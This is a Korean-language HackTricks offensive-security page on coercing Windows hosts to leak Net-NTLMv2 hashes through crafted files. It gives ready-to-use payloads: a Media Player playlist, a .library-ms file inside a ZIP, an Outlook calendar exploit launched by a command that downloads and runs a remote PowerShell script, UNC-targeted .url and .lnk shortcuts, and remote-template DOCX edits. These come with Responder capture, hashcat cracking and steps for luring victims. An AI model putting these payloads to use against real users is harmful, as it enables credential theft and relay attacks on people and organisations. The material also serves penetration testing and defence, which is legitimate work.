# NTLM creds를 훔칠 장소

{{#include ../../banners/hacktricks-training.md}}

**다음에서 제공하는 훌륭한 아이디어들을 모두 확인하세요: [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) — 온라인에서 microsoft word 파일을 다운로드하는 방법부터 ntlm leaks source: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md 및 [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**


### Windows Media Player 재생 목록 (.ASX/.WAX)

대상이 당신이 제어하는 Windows Media Player 재생 목록을 열거나 미리보기하도록 유도할 수 있다면, 항목을 UNC 경로로 지정하여 Net‑NTLMv2를 leak할 수 있습니다. WMP는 참조된 미디어를 SMB를 통해 가져오려고 시도하며 암묵적으로 인증합니다.

예시 payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
수집 및 cracking 흐름:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### ZIP-embedded .library-ms NTLM leak (CVE-2025-24071/24055)

Windows 탐색기는 ZIP 아카이브 내부에서 .library-ms 파일을 직접 열 때 이를 안전하지 않게 처리합니다. 라이브러리 정의가 원격 UNC 경로(예: \\attacker\share)를 가리키면, ZIP 내부에서 .library-ms를 단순히 탐색하거나 실행하는 것만으로 Explorer가 해당 UNC를 열거하고 공격자에게 NTLM 인증을 전송합니다. 이로 인해 NetNTLMv2가 생성되며, 이는 오프라인에서 크랙하거나 잠재적으로 릴레이될 수 있습니다.

Minimal .library-ms pointing to an attacker UNC
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Operational steps
- 위의 XML로 .library-ms 파일을 생성하세요 (set your IP/hostname).
- 파일을 Zip으로 압축하세요 (on Windows: Send to → Compressed (zipped) folder) 그리고 ZIP을 대상에 전달하세요.
- NTLM capture listener를 실행하고 피해자가 ZIP 안에서 .library-ms를 열 때까지 기다리세요.


### Outlook calendar reminder sound path (CVE-2023-23397) – zero‑click Net‑NTLMv2 leak

Microsoft Outlook for Windows는 캘린더 항목에서 확장된 MAPI 속성 PidLidReminderFileParameter를 처리했습니다. 해당 속성이 UNC path(예: \\attacker\share\alert.wav)를 가리키면, 알림이 실행될 때 Outlook은 SMB share에 접속하여 사용자의 Net‑NTLMv2를 아무 클릭 없이 leak했습니다. 이 문제는 2023년 3월 14일에 패치되었지만, 레거시/미수정 환경 및 과거 사고 대응에서는 여전히 매우 중요합니다.

Quick exploitation with PowerShell (Outlook COM):
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
Listener 측:
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
Notes
- 피해자는 알림이 트리거될 때 Outlook for Windows만 실행되고 있으면 된다.
- 이 leak은 Net‑NTLMv2를 생성하며 offline cracking 또는 relay에 적합하다 (not pass‑the‑hash).


### .LNK/.URL 아이콘 기반 zero‑click NTLM leak (CVE‑2025‑50154 – CVE‑2025‑24054의 우회)

Windows Explorer는 단축 아이콘을 자동으로 렌더링한다. 최근 연구에 따르면 Microsoft의 2025년 4월 UNC‑icon shortcuts 패치 이후에도, shortcut의 대상(target)을 UNC 경로에 호스팅하고 아이콘을 로컬에 유지하면 클릭 없이 NTLM 인증을 트리거할 수 있었다(패치 우회에 CVE‑2025‑50154 할당). 폴더를 단순히 보기만 해도 Explorer가 원격 대상에서 메타데이터를 가져와 공격자 SMB 서버로 NTLM을 전송한다.

Minimal Internet Shortcut payload (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
PowerShell을 통한 프로그램 바로가기 payload (.lnk):
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
배포 아이디어
- 바로가기를 ZIP에 넣고 피해자가 탐색하게 유도합니다.
- 피해자가 열어볼 쓰기 가능한 공유에 바로가기를 배치합니다.
- 같은 폴더의 다른 유인 파일들과 함께 넣어 Explorer가 항목을 미리 보도록 합니다.


### Office remote template injection (.docx/.dotm) to coerce NTLM

Office 문서는 외부 템플릿을 참조할 수 있습니다. 첨부된 템플릿을 UNC path로 설정하면 문서를 열 때 SMB로 인증이 발생합니다.

Minimal DOCX relationship changes (inside word/):

1) word/settings.xml을 편집하고 첨부된 템플릿 참조를 추가합니다:
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) word/_rels/settings.xml.rels를 편집하고 rId1337을 자신의 UNC로 가리키게 하세요:
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) .docx로 재패키징하여 전달합니다. SMB capture listener를 실행하고 오픈이 발생할 때까지 기다립니다.

캡처 후 relaying 또는 abusing NTLM에 대한 아이디어는 다음을 확인하세요:

{{#ref}}
README.md
{{#endref}}


## 참고 자료
- [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [MSRC – Microsoft mitigates Outlook EoP (CVE‑2023‑23397) and explains the NTLM leak via PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [Cymulate – Zero‑click, one NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)


{{#include ../../banners/hacktricks-training.md}}
